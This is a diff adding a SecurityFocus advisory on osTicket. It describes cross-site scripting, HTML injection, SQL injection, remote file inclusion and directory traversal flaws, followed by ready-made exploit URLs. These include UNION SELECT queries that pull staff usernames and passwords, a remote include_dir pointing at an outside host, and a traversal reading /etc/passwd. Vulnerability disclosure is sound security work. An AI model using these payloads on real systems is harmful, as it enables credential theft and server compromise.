@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/13478/info
+
+osTicket is affected by multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Reportedly the application permits the inclusion of remote code that could be run under the permissions of the affected Web server.
+
+The application is vulnerable to multiple cross-site scripting vulnerabilities. Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials; other attacks are also possible.
+
+If the file upload feature is enabled then a directory traversal vulnerability is possible. This vulnerability could be exploited to retrieve sensitive or privileged information normally accessible to the Web server.
+
+The application is prone to HTML injection vulnerabilities. Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+The application is also prone to multiple SQL injection vulnerabilities. Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 
+
+http://www.example.com/view.php?e=test@test.com&t=480826[XSS]
+http://www.example.com/include/header.php?osticket_title=%3C/title%3E[XSS]
+http://www.example.com/include/admin_login.php?em=asdf[XSS]
+http://www.example.com/include/user_login.php?e=asdf[XSS]
+http://www.example.com/include/open_submit.php?err=[XSS]
+
+http://www.example.com/admin.php?a=view&id=-99%20UNION%20SELECT%20username,password,0,0,0,0,0,0,0,0,0%20FROM%20ticket_reps%20WHERE%201/*
+http://www.example.com/admin.php?a=view&id=-99%20UNION%20SELECT%20username,password,'your@email.org',0,0,0,0,0,0,0,0%20FROM%20ticket_reps%20WHERE%201/*
+http://www.example.com/view.php?s=advanced&query=&cat=-99%20UNION%20SELECT%2031337,0,0,0,password%20FROM%20ticket_reps%20WHERE%20ID=5/*&status=&sort=ID&way=ASC&per=5&search_submit=Search
+
+http://www.example.com/include/main.php?config[search_disp]=true&include_dir=http://www.example.com
+
+http://www.example.com/attachments.php?file=../../../../../../.. /etc/passwd 
